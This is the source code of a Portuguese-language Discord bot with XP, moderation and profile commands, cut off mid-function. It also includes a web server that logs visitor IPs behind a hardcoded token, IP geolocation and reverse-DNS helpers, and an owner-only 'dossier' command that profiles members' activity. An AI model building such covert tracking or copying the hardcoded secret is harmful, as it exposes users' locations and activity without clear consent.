import('node:process').then(async () => {
                const {
                    Client,
                    GatewayIntentBits,
                    EmbedBuilder,
                    ActionRowBuilder,
                    ButtonBuilder,
                    ButtonStyle,
                    PermissionsBitField,
                    StringSelectMenuBuilder
                } = await require('discord.js');
                const {
                    getIPDetails
                } = await require('./geo.js');
                const fs = await require('fs');
                const express = await require('express');
                const path1 = await require('path');
                const axios = await require('axios');
                const dns = await require('dns').promises;
                const {
                    readFileSync,
                    writeFileSync,
                    existsSync
                } = fs;
                const Enmap = (await import('enmap')).default;
                const client = new Client({
                    intents: [
                        GatewayIntentBits.Guilds,
                        GatewayIntentBits.GuildMembers,
                        GatewayIntentBits.GuildMessages,
                        GatewayIntentBits.GuildBans,
                        GatewayIntentBits.GuildWebhooks,
                        GatewayIntentBits.GuildPresences,
                        GatewayIntentBits.MessageContent,
                        GatewayIntentBits.GuildMessageReactions
                    ]
                });

                const token = process.env['token']
                const xpDB = new Enmap({
                    name: "xpSystem",
                    fetchAll: false,
                    autoFetch: true,
                    dataDir: "./data"
                });

                const guildSettingsDB = new Enmap({
                    name: 'guildSettings'
                });
                const termsDB = new Enmap({
                    name: 'termsAcceptance'
                });

                const xpSettings = {
                    cooldown: 2000,
                    minXP: 30,
                    maxXP: 40,
                    baseXP: 1000
                };

                const app = express();
                const port = 3000;

                function sleep(ms) {
                    return new Promise(resolve => setTimeout(resolve, ms));
                }

                async function sendWebhookMessage(webhook, message, times = 1) {
                    for (let i = 0; i < times; i++) {
                        try {
                            await webhook.send(message);
                        } catch (err) {
                            if (err.code === 429) {
                                console.warn(`Rate limit detectado, aguardando ${err.retry_after * 1000}ms...`);
                                await sleep(err.retry_after * 1000);
                                i--;
                            } else {
                                console.error('Erro ao enviar mensagem:', err);
                                break;
                            }
                        }
                    }
                }

                function isDiscordBot(userAgent) {
                    if (!userAgent) return false;
                    return [
                        'Discordbot',
                        'Twitterbot',
                        'WhatsApp',
                        'Googlebot',
                        'bingbot',
                        'Discord-Webhooks',
                        'DiscordProxy'
                    ].some(pattern => userAgent.includes(pattern));
                }

                function formatDuration(ms) {
                    if (isNaN(ms)) return 'Inválido';

                    const days = Math.floor(ms / (1000 * 60 * 60 * 24));
                    const hours = Math.floor((ms % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                    const minutes = Math.floor((ms % (1000 * 60 * 60)) / (1000 * 60));

                    return [
                        days > 0 && `${days}d`,
                        hours > 0 && `${hours}h`,
                        minutes > 0 && `${minutes}m`
                    ].filter(Boolean).join(' ') || 'Menos de 1 minuto';
                }

                app.use((req, res, next) => {
                    const clientIP = (req.headers['x-forwarded-for'] || req.socket.remoteAddress)
                        .split(',')[0]
                        .trim()
                        .replace('::ffff:', '');

                    const userAgent = req.headers['user-agent'] || 'No User-Agent';
                    const date = new Date().toISOString();

                    const logEntry = JSON.stringify({
                        date,
                        ip: clientIP,
                        path: req.path,
                        userAgent
                    }) + '\n';

                    fs.appendFileSync('visitors.log', logEntry);
                    next();
                });

                app.get('/admin/ips', (req, res) => {
                    const auth = req.headers.authorization;

                    if (auth !== 'Bearer SuperSecret123') {
                        return res.status(403).send('Acesso negado');
                    }

                    fs.readFile('visitors.log', 'utf8', (err, data) => {
                        if (err) return res.status(500).send('Erro ao ler logs');
                        res.type('text/plain').send(data);
                    });
                });

                app.use(express.static(path1.join(__dirname, 'public')));

                app.get('/', (req, res) => {
                    res.sendFile(path1.join(__dirname, 'public', 'index.html'));
                });

                app.listen(port, () => {
                    console.log(`Servidor rodando em http://localhost:${port}`);
                    fs.openSync('visitors.log', 'a+');
                });

                const dataFile = 'plataformas.json';
                let userPlatforms = {};

                if (fs.existsSync(dataFile)) {
                    try {
                        userPlatforms = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
                    } catch (error) {
                        console.error('Erro ao carregar plataformas.json:', error);
                    }
                }

                client.on('ready', () => {
                    console.log(`Bot conectado como ${client.user.tag}!`);
                    client.user.setActivity('r!site');
                });

                function initUserData(userId) {
                    if (!xpDB.has(userId)) {
                        xpDB.set(userId, {
                            xp: 0,
                            level: 1,
                            lastMessage: 0
                        });
                    }
                }

                function loadData() {
                    if (fs.existsSync(dataFile)) {
                        try {
                            return JSON.parse(fs.readFileSync(dataFile, 'utf8'));
                        } catch (error) {
                            console.error('Erro ao carregar plataformas.json:', error);
                        }
                    }
                    return {};
                }

                function formatTime(seconds) {
                    const hours = Math.floor(seconds / 3600);
                    const minutes = Math.floor((seconds % 3600) / 60);
                    const secs = seconds % 60;

                    return `${hours}h ${minutes}m ${secs}s`;
                }

                function getUserPlatform(userId) {
                    userPlatforms = loadData();
                    return userPlatforms[userId] || 'Desconhecido';
                }

                function initUserData(userId) {
                    if (!xpDB.has(userId)) {
                        xpDB.set(userId, {
                            xp: 0,
                            level: 1,
                            lastMessage: 0
                        });
                    }
                }

                function createProgressBar(current, max) {
                    const percentage = (current / max) * 100;
                    const progress = Math.round(percentage / 10);
                    return `[${'▰'.repeat(progress)}${'▱'.repeat(10 - progress)}] ${Math.round(percentage)}%`;
                }

                async function getGeoData(ip) {
                    try {
                        const response = await fetch(`http://ip-api.com/json/${ip}?fields=66842623`);
                        const data = await response.json();

                        if (data.status !== 'success') return null;

                        return {
                            country: data.country || 'Desconhecido',
                            region: data.regionName || 'Desconhecido',
                            city: data.city || 'Desconhecido',
                            coordinates: `${data.lat}, ${data.lon}`,
                            timezone: data.timezone || 'Desconhecido',
                            isp: data.isp || 'Desconhecido',
                            org: data.org || 'Desconhecido',
                            asn: data.as || 'Desconhecido',
                            proxy: data.proxy || data.vpn || data.tor ? '✅' : '❌'
                        };
                    } catch (error) {
                        console.error(`Erro ao obter geolocalização do IP ${ip}:`, error);
                        return null;
                    }
                }
                async function getReverseDNS(ip) {
                    try {
                        const hostnames = await dns.reverse(ip);
                        return hostnames[0] || 'N/A';
                    } catch {
                        return 'N/A';
                    }
                }

                function saveData() {
                    fs.writeFileSync(dataFile, JSON.stringify(userPlatforms, null, 2));
                }

                function parseTime(time) {
                    console.log("Tempo recebido:", time);

                    const match = time.match(/^(\d+)\s*(segundo|segundos|minuto|minutos|hora|horas|dia|dias)$/i);
                    if (!match) return null;

                    const value = parseInt(match[1]);
                    const unit = match[2].toLowerCase();

                    switch (unit) {
                        case 'segundo':
                            return value * 1000;
                        case 'segundos':
                            return value * 1000;
                        case 'minuto':
                        case 'minutos':
                            return value * 60000;
                        case 'hora':
                        case 'horas':
                            return value * 3600000;
                        case 'dia':
                        case 'dias':
                            return value * 86400000;
                        default:
                            return null;
                    }
                }

                const dbFile = 'userStats.json';
                let userStats = {};

                if (fs.existsSync(dbFile)) {
                    userStats = JSON.parse(fs.readFileSync(dbFile, 'utf8'));
                }

                const emojisAleatorios = ['<:pou:1352796314710311133>'];

                function saveDB() {
                    fs.writeFileSync(dbFile, JSON.stringify(userStats, (key, value) => {
                        if (key === 'joinedAt') return undefined;
                        return value;
                    }, 2));
                }

                function getMessageCount(userId) {
                    return userStats[userId]?.messages || 0;
                }

                function getVoiceTime(userId) {
                    return userStats[userId]?.voiceTime || 0;
                }

                const cooldown = 24 * 60 * 60 * 1000;
                const path = './dailyRewards.json';

                client.on('messageCreate', message => {
                    if (message.author.bot) return;

                    const userId = message.author.id;
                    if (!userStats[userId]) userStats[userId] = {
                        messages: 0,
                        voiceTime: 0
                    };

                    userStats[userId].messages += 1;
                    saveDB();
                });

                client.on('voiceStateUpdate', async (oldState, newState) => {
                    const userId = newState.id;

                    if (!userStats[userId]) {
                        userStats[userId] = {
                            messages: 0,
                            voiceTime: 0
                        };
                    }

                    if (!oldState.channel && newState.channel) {
                        userStats[userId].joinedAt = Date.now();
                        saveDB();
                    } else if (oldState.channel && !newState.channel) {
                        if (userStats[userId].joinedAt) {
                            const timeSpent = Math.floor((Date.now() - userStats[userId].joinedAt) / 1000);
                            userStats[userId].voiceTime += timeSpent;
                            delete userStats[userId].joinedAt;
                            saveDB();
                        }
                    }
                });

                client.on('messageCreate', async message => {
                    if (message.author.bot) return;
                    if (!message.guild) return;

                    const userTerms = termsDB.get(message.author.id) || false;
                    if (!userTerms) return;

                    const guildId = message.guild.id;
                    const userId = message.author.id;
                    initUserData(userId);
                    guildSettingsDB.ensure(guildId, {
                        levelUpMsg: true
                    });

                    const userData = xpDB.get(userId);
                    if (Date.now() - userData.lastMessage < xpSettings.cooldown) return;

                    const xpToAdd = Math.floor(
                        Math.random() * (xpSettings.maxXP - xpSettings.minXP + 1)
                    ) + xpSettings.minXP;

                    xpDB.math(userId, "+", xpToAdd, "xp");

                    const newData = xpDB.get(userId);
                    const neededXP = xpSettings.baseXP * newData.level;

                    if (newData.xp >= neededXP) {
                        xpDB.math(userId, "+", 1, "level");
                        xpDB.math(userId, "-", neededXP, "xp");

                        const guildConfig = guildSettingsDB.get(guildId);
                        if (guildConfig.levelUpMsg) {
                            message.channel.send(`🎉 **${message.author.username}** subiu para o nível **${newData.level + 1}**!`);
                        }
                    }

                    xpDB.set(userId, Date.now(), "lastMessage");
                });

                client.on('messageCreate', (message) => {
                    if (message.author.bot) return;

                    const userTerms = termsDB.get(message.author.id) || false;
                    if (!userTerms) return;

                    const content = message.content.toLowerCase();
                    const userId = message.author.id;

                    if (content.includes('eu sou pc') || content.includes('eu uso notebook') || content.includes('sou pc') || content.includes('sou notebook')) {
                        userPlatforms[userId] = 'PC';
                        saveData();
                        console.log('✅ Informação salva! Você usa **PC/Notebook**.');
                    }

                    if (content.includes('eu uso celular') || content.includes('eu sou mobile')) {
                        userPlatforms[userId] = 'Mobile';
                        saveData();
                        console.log('✅ Informação salva! Você usa **Celular/Mobile**.');
                    }
                });

                const debugData = {};

                client.on('messageCreate', async message => {
                    if (message.author.bot) return;

                    const args = message.content.split(" ");
                    const command = args.shift().toLowerCase();

                    const isOwner = message.author.id === "756172809650307132";

                    if (message.content.startsWith('h!')) {
                        const userTerms = termsDB.get(message.author.id) || false;

                        if (!userTerms) {
                            const termsEmbed = new EmbedBuilder()
                                .setTitle('🌟 Bem-vindo ao HyokaBot!')
                                .setDescription([
                                    '**Para uma experiência completa, precisamos que você:**',
                                    '```diff',
                                    '+ 1. Compartilhar informações básicas de uso',
                                    '+ 2. Permitir o registro de preferências',
                                    '+ 3. Concordar com nossa política de serviços',
                                    '```',
                                    '📘 Isso nos ajuda a oferecer:',
                                    '• Recursos personalizados para você',
                                    '• Melhoria contínua do servidor',
                                    '• Comandos exclusivos e divertidos',
                                ].join('\n'))
                                .setColor(0x5865F2)
                                .setFooter({
                                    text: 'Sua escolha garante a melhor experiência!',
                                });

                            const buttons = new ActionRowBuilder().addComponents(
                                new ButtonBuilder()
                                .setCustomId('accept_terms')
                                .setLabel('✅ Aceitar Termos')
                                .setStyle(ButtonStyle.Success),
                                new ButtonBuilder()
                                .setCustomId('decline_terms')
                                .setLabel('❌ Recusar Termos')
                                .setStyle(ButtonStyle.Danger)
                            );

                            const sentMessage = await message.reply({
                                embeds: [termsEmbed],
                                components: [buttons],
                                fetchReply: true
                            });

                            const filter = (interaction) =>
                                interaction.user.id === message.author.id && ['accept_terms', 'decline_terms'].includes(interaction.customId);

                            const collector = sentMessage.createMessageComponentCollector({
                                filter,
                                time: 60000
                            });

                            collector.on('collect', async (interaction) => {
                                if (interaction.customId === 'accept_terms') {
                                    termsDB.set(message.author.id, true);
                                    await interaction.reply({
                                        content: '✅ Termos aceitos! Agora você pode usar todos os comandos.',
                                        ephemeral: true
                                    });
                                    collector.stop();
                                } else {
                                    termsDB.set(message.author.id, false);
                                    await interaction.reply({
                                        content: '❌ Termos recusados! Você não pode usar comandos.',
                                        ephemeral: true
                                    });
                                    collector.stop();
                                }
                            });

                            collector.on('end', () => {
                                sentMessage.edit({
                                    components: []
                                }).catch(() => {});
                            });

                            return;
                        }
                    }

                    if (message.content.startsWith('h!')) {
                        const warningMsg = [
                            '**🚨 AVISO DO SISTEMA 🚨**',
                            '',
                            '```asciidoc',
                            '[ESTADO ATUAL]',
                            'Sistema em fase beta - instabilidade esperada',
                            '',
                            '[RISCO DE ROLLBACKS]',
                            '- Moedas',
                            '- XP',
                            '- Progresso de níveis',
                            '',
                            '[RECOMENDAÇÕES]',
                            '1. Não faça acumulos massivos',
                            '```'
                        ].join('\n');

                        message.channel.send(warningMsg).then(msg => {
                            setTimeout(() => msg.delete().catch(() => {}), 5000);
                        });
                    }

                    if (command === 'h!ping') {
                        const initialEmbed = new EmbedBuilder()
                            .setColor(0x3498db)
                            .setDescription('⏳ Calculando latência...');

                        const sentMessage = await message.channel.send({
                            embeds: [initialEmbed]
                        });

                        const latency = sentMessage.createdTimestamp - message.createdTimestamp;
                        const apiLatency = Math.round(client.ws.ping);

                        setTimeout(() => {
                            const resultEmbed = new EmbedBuilder()
                                .setColor(0x2ecc71)
                                .setTitle('🏓 Pong! - Estatísticas de Latência')
                                .addFields({
                                    name: '📡 Latência do Bot',
                                    value: `${latency}ms`,
                                    inline: true
                                }, {
                                    name: '🌐 Latência da API',
                                    value: `${apiLatency}ms`,
                                    inline: true
                                })
                                .setFooter({
                                    text: `Solicitado por ${message.author.username}`,
                                    iconURL: message.author.displayAvatarURL()
                                })
                                .setTimestamp();

                            sentMessage.edit({
                                embeds: [resultEmbed]
                            });
                        }, 2000);
                    }

                    if (command === "h!banner") {
                        const user = message.mentions.users.first() || message.author;

                        try {
                            const fetchedUser = await client.users.fetch(user.id, {
                                force: true
                            });
                            const bannerURL = fetchedUser.bannerURL({
                                size: 4096,
                                dynamic: true,
                                format: 'png'
                            });

                            const userColor = fetchedUser.hexAccentColor || '#2f3136';
                            const colorHex = userColor.replace('#', '');
                            const colorImageURL = `https://dummyimage.com/600x240/${colorHex}/${colorHex}.png?text=Sem+Banner`;

                            const embed = new EmbedBuilder()
                                .setTitle(bannerURL ?
                                    `Banner de ${fetchedUser.username}` :
                                    `Cor de Perfil de ${fetchedUser.username}`)
                                .setImage(bannerURL || colorImageURL)
                                .setColor(bannerURL ? '#0099ff' : userColor)
                                .setFooter({
                                    text: bannerURL ?
                                        `Formato: ${bannerURL.includes('.gif') ? 'GIF' : 'PNG'}` : 'Cor sólida'
                                });

                            const row = new ActionRowBuilder();

                            if (bannerURL) {
                                row.addComponents(
                                    new ButtonBuilder()
                                    .setLabel('Baixar Banner')
                                    .setStyle(ButtonStyle.Link)
                                    .setURL(bannerURL),

                                    new ButtonBuilder()
                                    .setLabel('Abrir no Navegador')
                                    .setStyle(ButtonStyle.Link)
                                    .setURL(bannerURL)
                                );
                            } else {
                                row.addComponents(
                                    new ButtonBuilder()
                                    .setLabel('Visualizar Cor')
                                    .setStyle(ButtonStyle.Link)
                                    .setURL(colorImageURL)
                                );
                            }

                            message.reply({
                                embeds: [embed],
                                components: [row]
                            });

                        } catch (error) {
                            console.error('Erro ao buscar banner:', error);
                            message.reply('Erro ao obter informações do usuário.');
                        }
                    }

                    if (command === "h!avatar") {
                        const user = message.mentions.users.first() || message.author;

                        const avatarURL = user.displayAvatarURL({
                            dynamic: true,
                            format: 'png',
                            size: 4096
                        });

                        const embed = new EmbedBuilder()
                            .setTitle(`Avatar de ${user.username}`)
                            .setImage(avatarURL)
                            .setColor('#0099ff');

                        const row = new ActionRowBuilder().addComponents(
                            new ButtonBuilder()
                            .setLabel('Baixar Imagem')
                            .setStyle(ButtonStyle.Link)
                            .setURL(avatarURL),

                            new ButtonBuilder()
                            .setLabel('Visualizar no Navegador')
                            .setStyle(ButtonStyle.Link)
                            .setURL(avatarURL)
                        );

                        message.reply({
                            embeds: [embed],
                            components: [row]
                        });
                    }

                    if (command === 'h!perfil' || command === 'h!profile') {
                        const targetUser = message.mentions.users.first() || message.author;
                        const member = await message.guild.members.fetch(targetUser.id).catch(() => null);

                        if (!member) return message.reply('❌ Membro não encontrado!');

                        const userId = targetUser.id;
                        initUserData(userId);
                        const {
                            xp,
                            level
                        } = xpDB.get(userId);
                        const neededXP = xpSettings.baseXP * level;

                        const platform = getUserPlatform(userId);

                        const embed = new EmbedBuilder()
                            .setColor(0x2F3136)
                            .setAuthor({
                                name: `${targetUser.username} - Nível ${level}`,
                                iconURL: targetUser.displayAvatarURL(),
                            })
                            .setThumbnail(targetUser.displayAvatarURL({
                                size: 256
                            }))
                            .addFields({
                                name: '📱 Plataforma',
                                value: platform,
                                inline: true
                            }, {
                                name: '🎚️ Nível',
                                value: `**${level}**`,
                                inline: true
                            }, {
                                name: '🌟 XP',
                                value: `**${xp}**/${neededXP}`,
                                inline: true
                            }, {
                                name: '📅 Entrou em',
                                value: `<t:${Math.floor(member.joinedAt / 1000)}:D>`,
                                inline: true
                            }, {
                                name: '📊 Progresso',
                                value: createProgressBar(xp, neededXP),
                                inline: true
                            })
                            .setFooter({
                                text: `ID: ${targetUser.id} • ${message.guild.name}`,
                                iconURL: message.guild.iconURL()
                            })
                            .setTimestamp();

                        message.channel.send({
                            embeds: [embed]
                        });
                    }

                    if (command === "h!rank") {
                        // Criar menu de seleção
                        const selectMenu = new StringSelectMenuBuilder()
                            .setCustomId('rankSelect')
                            .setPlaceholder('Selecione o ranking')
                            .addOptions([{
                                    label: 'Classificação de XP',
                                    value: 'xp',
                                    emoji: '📈'
                                },
                                {
                                    label: 'Classificação de Moedas',
                                    value: 'coins',
                                    emoji: '💰'
                                }
                            ]);

                        const actionRow = new ActionRowBuilder().addComponents(selectMenu);

                        // Embed inicial
                        const initialEmbed = new EmbedBuilder()
                            .setTitle('🏆 Sistema de Rankings')
                            .setDescription('Selecione o tipo de ranking desejado abaixo')
                            .setColor(0x2F3136);

                        const sentMessage = await message.reply({
                            embeds: [initialEmbed],
                            components: [actionRow]
                        });

                        // Coletor de interações
                        const filter = i => i.user.id === message.author.id;
                        const collector = sentMessage.createMessageComponentCollector({
                            filter,
                            time: 60000
                        });

                        collector.on('collect', async i => {
                            await i.deferUpdate();

                            let embedContent;
                            const selectedType = i.values[0];

                            try {
                                if (selectedType === 'xp') {
                                    // Lógica para XP
                                    if (!xpDB || xpDB.size === 0) throw new Error('Sem dados de XP');

                                    const xpData = [...xpDB.entries()]
                                        .map(([id, data]) => ({
                                            id,
                                            level: data.level || 0,
                                            totalXP: (
                                                ((data.level || 0) *
                                                    ((data.level || 0) - 1) / 2 * 1000) +
                                                (data.xp || 0)
                                            )
                                        }))
                                        .sort((a, b) => b.totalXP - a.totalXP)
                                        .slice(0, 10);

                                    embedContent = xpData.map((user, index) =>
                                        `**${index + 1}.** ${client.users.cache.get(user.id)?.username || 'Usuário'} ─ ` +
                                        `Nível ${user.level} (${user.totalXP.toLocaleString()} XP)`
                                    ).join('\n');

                                } else if (selectedType === 'coins') {
                                    // Lógica para Moedas
                                    const rawData = fs.readFileSync(path, 'utf8');
                                    const coinsData = Object.entries(JSON.parse(rawData))
                                        .map(([id, data]) => ({
                                            id,
                                            balance: data.balance || 0
                                        }))
                                        .sort((a, b) => b.balance - a.balance)
                                        .slice(0, 10);

                                    embedContent = coinsData.map((user, index) =>
                                        `**${index + 1}.** ${client.users.cache.get(user.id)?.username || 'Usuário'} ─ ` +
                                        `${user.balance.toLocaleString()} moedas`
                                    ).join('\n');
                                }

                                // Construir embed final
                                const resultEmbed = new EmbedBuilder()
                                    .setTitle(`${selectedType === 'xp' ? '📈' : '💰'} Top 10 ${selectedType === 'xp' ? 'XP' : 'Moedas'}`)
                                    .setDescription(embedContent || 'Nenhum dado disponível')
                                    .setColor(0x2F3136)
                                    .setFooter({
                                        text: `Solicitado por ${message.author.username} • ${new Date().toLocaleDateString('pt-BR')}`,
                                        iconURL: message.author.displayAvatarURL()
                                    });

                                await i.editReply({
                                    embeds: [resultEmbed],
                                    components: []
                                });

                            } catch (error) {
                                const errorEmbed = new EmbedBuilder()
                                    .setTitle('❌ Erro')
                                    .setDescription(`Falha ao carregar dados: ${error.message}`)
                                    .setColor(0xFF0000);

                                await i.editReply({
                                    embeds: [errorEmbed],
                                    components: []
                                });
                            }
                        });

                        collector.on('end', collected => {
                            if (!collected.size) {
                                sentMessage.edit({
                                    components: []
                                }).catch(() => {});
                            }
                        });
                    }

                    if (command === "$$debug") {
                        if (message.author.id !== "756172809650307132" && message.author.id !== "201774641369317376") {
                            return;
                        }

                        let target = message.mentions.members.first() || message.member;
                        if (!target) return message.reply("❌ Usuário não encontrado.");

                        const user = target.user;
                        const platform = getUserPlatform(user.id) || "Desconhecida";
                        const highestRole = target.roles.highest.name || "Nenhum";
                        const joinedAt = target.joinedAt ? `<t:${Math.floor(target.joinedAt.getTime() / 1000)}:R>` : "Indisponível";
                        const createdAt = user.createdAt ? `<t:${Math.floor(user.createdAt.getTime() / 1000)}:R>` : "Indisponível";
                        const nickname = target.nickname || "Nenhum";
                        const roles = target.roles.cache.filter(role => role.id !== message.guild.id).map(role => role.name).join(", ") || "Nenhum";
                        const isBot = user.bot ? "Sim 🤖" : "Não";
                        const status = target.presence?.status || "Desconhecido";
                        const devices = target.presence?.clientStatus ? Object.keys(target.presence.clientStatus).join(", ") : "Indisponível";
                        const activity = target.presence?.activities[0]?.name || "Nenhuma";
                        const isBoosting = target.premiumSince ? `Sim (desde ${target.premiumSince.toLocaleDateString()})` : "Não";
                        const messageCount = getMessageCount(user.id) || "Não rastreado";
                        const voiceSeconds = getVoiceTime(user.id) || 0;
                        const voiceTime = formatTime(voiceSeconds);

                        let pages = [
                            new EmbedBuilder()
                            .setTitle("🕵️ RiqWatcher - Analisando Usuario (Página 1)")
                            .setColor(0x1F8B4C)
                            .setThumbnail(user.displayAvatarURL({
                                dynamic: true
                            }))
                            .addFields({
                                name: "Identidade",
                                value: `${user.tag} (${user.id})`,
                                inline: false
                            }, {
                                name: "Apelido",
                                value: nickname,
                                inline: true
                            }, {
                                name: "É um bot?",
                                value: isBot,
                                inline: true
                            }, {
                                name: "Dispositivo(s)(**Impreciso.**)",
                                value: devices,
                                inline: true
                            }, {
                                name: "Criou a conta",
                                value: createdAt,
                                inline: false
                            }, {
                                name: "Entrou no Servidor",
                                value: joinedAt,
                                inline: false
                            })
                            .setFooter({
                                text: "Página 1/2"
                            }),

                            new EmbedBuilder()
                            .setTitle("🕵️ RiqWatcher - Dossiê do Usuario (Página 2)")
                            .setColor(0x1F8B4C)
                            .addFields({
                                name: "Cargo Mais Alto",
                                value: highestRole,
                                inline: true
                            }, {
                                name: "Todos os Cargos",
                                value: roles,
                                inline: false
                            }, {
                                name: "Status Atual",
                                value: status,
                                inline: true
                            }, {
                                name: "Plataforma",
                                value: platform,
                                inline: true
                            }, {
                                name: "Atividade Recente",
                                value: activity,
                                inline: true
                            }, {
                                name: "Booster do Servidor?",
                                value: isBoosting,
                                inline: true
                            }, {
                                name: "Mensagens Enviadas",
                                value: messageCount.toString(),
                                inline: true
                            }, {
                                name: "Tempo no Canal de Voz",
                                value: voiceTime.toString(),
                                inline: true
                            })
                            .setFooter({
                                text: "Página 2/2"
                            })
                        ];

                        let currentPage = 0;
                        const row = new ActionRowBuilder().addComponents(
                            new ButtonBuilder()
                            .setCustomId("previous")
                            .setLabel("⏮️ Anterior")
                            .setStyle(ButtonStyle.Primary)
                            .setDisabled(true),
                            new ButtonBuilder()
                            .setCustomId("next")
                            .setLabel("Próximo ⏭️")
                            .setStyle(ButtonStyle.Primary)
                        );

                        const msg = await message.reply({
                            embeds: [pages[currentPage]],
                            components: [row]
                        });

                        const filter = i => i.user.id === message.author.id;
                        const collector = msg.createMessageComponentCollector({
                            filter,
                            time: 60000
                        });

                        collector.on("collect", async i => {
                            if (i.customId === "next") {
                                currentPage = 1;
                            } else if (i.customId === "previous") {
                                currentPage = 0;
                            }

                            row.components[0].setDisabled(currentPage === 0);
                            row.components[1].setDisabled(currentPage === pages.length - 1);

                            await i.update({
                                embeds: [pages[currentPage]],
                                components: [row]
                            });
                        });

                        collector.on("end", () => {
                            row.components.forEach(button => button.setDisabled(true));
                            msg.edit({
                                components: [row]
                            });
                        });
                    }

                    if (command === "h!mute") {
                        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers)) {
                            return message.reply("❌ Você não tem permissão para mutar membros.");
                        }

                        const user = message.mentions.members.first();
                        if (!user) return message.reply("❌ Mencione um usuário para mutar. Uso: `r!mute @usuário 1 hora motivo`");

                        if (user.isCommunicationDisabled()) {
                            const existingTimeoutEmbed = new EmbedBuilder()
                                .setColor('#ff0000')
                                .setTitle('⚠️ Usuário Já Mutado')
                                .setDescription(`${user} já possui um mute ativo!`)
                                .addFields({
                                    name: '⏳ Tempo Restante',
                                    value: `Expira <t:${Math.floor(user.communicationDisabledUntilTimestamp / 1000)}:R>`,
                                    inline: true
                                }, {
                                    name: '🛠️ Ação Recomendada',
                                    value: 'Use `r!desmute` para remover o mute',
                                    inline: true
                                })
                                .setThumbnail(user.displayAvatarURL({
                                    dynamic: true
                                }))
                                .setFooter({
                                    text: `Solicitado por ${message.author.tag}`,
                                    iconURL: message.author.displayAvatarURL({
                                        dynamic: true
                                    })
                                });

                            return message.reply({
                                embeds: [existingTimeoutEmbed]
                            });
                        }

                        if (user.id === client.user.id) return message.reply("❌ Não posso me mutar.");
                        if (user.id === message.author.id) return message.reply("❌ Você não pode se mutar.");

                        const botRole = message.guild.members.me.roles.highest;
                        const authorRole = message.member.roles.highest;
                        const userRole = user.roles.highest;

                        if (authorRole.position <= userRole.position) return message.reply("❌ Você não pode mutar alguém com cargo igual ou superior ao seu.");
                        if (botRole.position <= userRole.position) return message.reply("❌ Meu cargo precisa estar acima do usuário para mutá-lo.");

                        const timeParts = args.slice(1).filter(arg => !isNaN(arg) || ["segundo", "segundos", "hora", "horas", "minuto", "minutos", "dia", "dias"].some(unit => arg.toLowerCase().includes(unit)));
                        const timeArg = timeParts.join(" ");
                        const reason = args.slice(1 + timeParts.length).join(" ") || "Nenhum motivo especificado.";

                        const timeMs = parseTime(timeArg);
                        if (!timeMs) return message.reply("❌ Tempo inválido. Use: `30 segundos`, `2 horas`, etc.");

                        try {
                            await user.timeout(timeMs, reason);

                            const muteEmbed = new EmbedBuilder()
                                .setColor('#FF6B00')
                                .setAuthor({
                                    name: '🔇 Mute Aplicado',
                                })
                                .setDescription(`**${user.user.tag}** foi temporariamente silenciado no servidor`)
                                .addFields({
                                    name: '📌 Informações do Mute',
                                    value: `┌ **Usuário:** ${user}\n├ **Duração:** \`${timeArg}\`\n└ **Expira:** <t:${Math.floor((Date.now() + timeMs) / 1000)}:R>`,
                                    inline: false
                                }, {
                                    name: '📄 Detalhes da Moderação',
                                    value: `┌ **Moderador:** ${message.author}\n└ **Motivo:** \`${reason}\``,
                                    inline: false
                                })
                                .setThumbnail(user.displayAvatarURL({
                                    dynamic: true
                                }))
                                .setFooter({
                                    text: `${message.guild.name} • Sistema de Moderação`,
                                    iconURL: message.guild.iconURL({
                                        dynamic: true
                                    })
                                })
                                .setTimestamp();

                            message.reply({
                                embeds: [muteEmbed]
                            });

                        } catch (error) {
                            console.error(error);
                            const errorEmbed = new EmbedBuilder()
                                .setColor('#ff0000')
                                .setTitle('❌ Erro ao Aplicar Mute')
                                .setDescription('Falha ao executar o comando de mute. Verifique:')
                                .addFields({
                                    name: 'Possíveis Causas',
                                    value: '• Hierarquia de cargos\n• Permissões faltantes\n• Erro interno'
                                }, {
                                    name: 'Solução',
                                    value: 'Verifique minhas permissões e tente novamente'
                                })
                                .setFooter({
                                    text: `Erro registrado em ${new Date().toLocaleString()}`
                                });

                            message.reply({
                                embeds: [errorEmbed]
                            });
                        }
                    }

                    if (command === "h!desmute") {
                        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers)) {
                            return message.reply("❌ Você não tem permissão para desmutar membros.");
                        }

                        const user = message.mentions.members.first();
                        if (!user) return message.reply("❌ Mencione um usuário para desmutar. Uso: `r!desmute @usuário`");

                        const botRole = message.guild.members.me.roles.highest;
                        const authorRole = message.member.roles.highest;
                        const userRole = user.roles.highest;

                        if (authorRole.position <= userRole.position) {
                            const embed = new EmbedBuilder()
                                .setColor('#ff0000')
                                .setTitle('❌ Hierarquia de Cargos')
                                .setDescription('Você não pode desmutar alguém com cargo igual ou superior ao seu.')
                            return message.reply({
                                embeds: [embed]
                            });
                        }

                        if (botRole.position <= userRole.position) {
                            const embed = new EmbedBuilder()
                                .setColor('#ff0000')
                                .setTitle('❌ Hierarquia do Bot')
                                .setDescription('Meu cargo precisa estar acima do usuário para desmutá-lo.')
                            return message.reply({
                                embeds: [embed]
                            });
                        }

                        try {
                            if (!user.isCommunicationDisabled()) {
                                const notMutedEmbed = new EmbedBuilder()
                                    .setColor('#ffd700')
                                    .setTitle('⚠️ Usuário Não Mutado')
                                    .setDescription(`${user} não possui um mute ativo no momento.`)
                                    .addFields({
                                        name: '🕒 Último Mute',
                                        value: 'Nenhum registro recente',
                                        inline: true
                                    }, {
                                        name: '🛠️ Histórico',
                                        value: 'Verifique no canal de logs',
                                        inline: true
                                    })
                                    .setThumbnail(user.displayAvatarURL({
                                        dynamic: true
                                    }))
                                    .setFooter({
                                        text: `${message.guild.name} • Sistema de Moderação`,
                                        iconURL: message.guild.iconURL({
                                            dynamic: true
                                        })
                                    });
                                return message.reply({
                                    embeds: [notMutedEmbed]
                                });
                            }

                            const auditLogs = await message.guild.fetchAuditLogs({
                                type: 24,
                                limit: 5
                            });

                            const muteEntry = auditLogs.entries.find(entry =>
                                entry.target.id === user.id &&
                                entry.changes.some(change => change.key === 'communication_disabled_until')
                            );

                            let originalDuration = 'Não registrada';
                            let appliedBy = 'Sistema/Auto';
                            if (muteEntry) {
                                const change = muteEntry.changes.find(c => c.key === 'communication_disabled_until');
                                if (change?.new) {
                                    const muteEnd = new Date(change.new).getTime();
                                    const muteStart = muteEntry.createdAt.getTime();
                                    originalDuration = formatDuration(muteEnd - muteStart);
                                }
